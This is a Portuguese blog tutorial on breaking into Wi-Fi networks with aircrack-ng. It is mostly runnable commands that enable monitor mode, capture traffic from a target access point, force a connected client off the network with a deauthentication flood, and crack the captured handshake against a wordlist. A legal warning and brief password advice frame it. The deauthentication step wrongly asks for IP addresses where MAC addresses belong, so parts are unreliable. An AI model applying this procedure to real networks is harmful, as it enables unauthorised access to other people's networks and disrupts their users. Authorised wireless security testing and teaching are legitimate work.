---
title:  "Invasão de Redes Wireless com Aircrack-NG"
categories: seguranca
tags: aircrack-ng wifi linux
---

![{{ post.title }}]({{ site.url }}/assets/img_posts/aircrack-ng.png)

### ATENÇÃO!

Esse tutorial deve ser usado apenas para fins educativos em uma rede com devida autorização do proprietário.

Invadir dispositivo alheio, conectado ou não a rede de computadores, mediante violação de segurança com o fim de obter informações sem autorização é crime. No Brasil, pode acarretar em 1 ano de reclusão e multa.

Aproveite este conhecimento para progredir de maneira justa e sem prejudicar outras pessoas.

## Requerimentos

Para a realização deste tutorial será necessário um computador com o Sistema Operacional Debian ou variantes e que a máquina possua placa de rede wireless ou adaptador wi-fi, e acesso _root_.

Também é necessário que você possua uma _wordlist_ disponível em seu ambiente.

### Informação

Wordlists são arquivos que possuem várias palavras frequentemente utilizadas.

Você pode escrever o seu próprio arquivo ou encontrar exemplos através de uma simples busca no Google.

Precisará também de um ponto de acesso wireless, no qual você não esteja conectado com a interface de teste.

Para ter certeza sobre a existência de interfaces wi-fi, faça a verificação:

```sh
iwconfig
```

Se o dispositivo estiver conectado, mas não for listado; inicie a interface:

```sh
ifconfig wlan0 up
```

Veja as redes que estão ao seu alcance:

```sh
iwlist wlan0 scanning
```

Anote o Mac Adress e o Canal da rede alvo, pois precisará deles na sequência.

## Instalação

Para monitorar e capturar pacotes de um cliente da rede, precisaremos do **Aircrack-ng**:

```sh
sudo apt-get update && sudo apt-get install aircrack-ng
```

## Iniciando o Monitoramento

Estando com o aircrack-ng instalado, podemos começar:

Matando processos que podem causar incompatibilidades

```sh
airmon-ng check kill
```

Iniciando o monitoramento

```sh
airmon-ng start wlan0
```

## Listando Clientes

Pegue os dados do seu alvo e insira-os nas opções entre chaves (apague as chaves depois), abaixo:

```sh
airodump-ng mon0 --bssid {MAC_ADDRESS} --channel {CHANNEL} --write wifi.test
```

Depois disso, o scanner lhe mostrará uma lista com todas as Wokstations (clientes) que estão conectados na rede.

## Capturando Dados

Abra um novo terminal, escolha uma workstation ativa e capture os pacotes dela (ela irá cair durante esse processo):

```sh
aireplay-ng -0 100 -a {GATEWAY IP} -c {WORKSTATION IP} mon0 --ignore-negative-one
```

## Descobrindo a Senha

Através dos dados capturados, tente descobrir a senha:

```sh
aircrack-ng wifi.test-01.cap -w wordlist.txt
```

## Como impedir esse tipo de invasão?

Sempre utilize senhas complexas combinando caracteres especiais, como **!@#$%¨&#038;*()_+§**, e se possível configure como oculto o SSID da rede (embora o Aircrack-ng detectá-la) para que ela não seja vista como um possível alvo de crackers.

## Atualização

Use **wifite** e poupe seu tempo!
